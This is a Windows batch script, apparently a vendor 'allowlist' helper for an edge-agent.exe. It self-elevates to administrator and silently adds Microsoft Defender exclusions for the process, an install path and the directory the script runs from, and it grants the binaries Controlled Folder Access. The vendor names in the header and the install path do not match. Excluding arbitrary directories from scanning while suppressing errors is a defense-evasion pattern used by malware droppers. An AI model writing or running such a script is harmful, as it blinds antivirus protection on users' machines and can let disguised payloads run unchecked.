@echo off
:: ================================================================
:: OmSystems / KryptonVision Edge Agent - Windows Defender Allowlist
:: Whitelists edge-agent.exe and its installation directory in Defender
:: ================================================================

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Administrator privileges required. Requesting elevation...
    powershell -NoProfile -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)

set SCRIPT_DIR=%~dp0
set AGENT_PATH=C:\Program Files\Sentinel Grid\Edge Agent
set LOCAL_EXE=%SCRIPT_DIR%edge-agent.exe
set INSTALLED_EXE=%AGENT_PATH%\edge-agent.exe

echo [*] Applying Microsoft Defender Antivirus Whitelist...

powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess 'edge-agent.exe' -ErrorAction SilentlyContinue; Write-Host '  [OK] Process edge-agent.exe excluded'"
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%AGENT_PATH%' -ErrorAction SilentlyContinue; Write-Host '  [OK] Path %AGENT_PATH% excluded'"
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Write-Host '  [OK] Current directory excluded'"

if exist "%LOCAL_EXE%" (
    powershell -NoProfile -Command "Add-MpPreference -ControlledFolderAccessAllowedApplications '%LOCAL_EXE%' -ErrorAction SilentlyContinue; Write-Host '  [OK] Controlled Folder Access allowed for local binary'"
)
if exist "%INSTALLED_EXE%" (
    powershell -NoProfile -Command "Add-MpPreference -ControlledFolderAccessAllowedApplications '%INSTALLED_EXE%' -ErrorAction SilentlyContinue; Write-Host '  [OK] Controlled Folder Access allowed for installed binary'"
)

echo.
echo ============================================================
echo SUCCESS: Windows Defender exclusion rules successfully applied!
echo ============================================================
echo.
pause
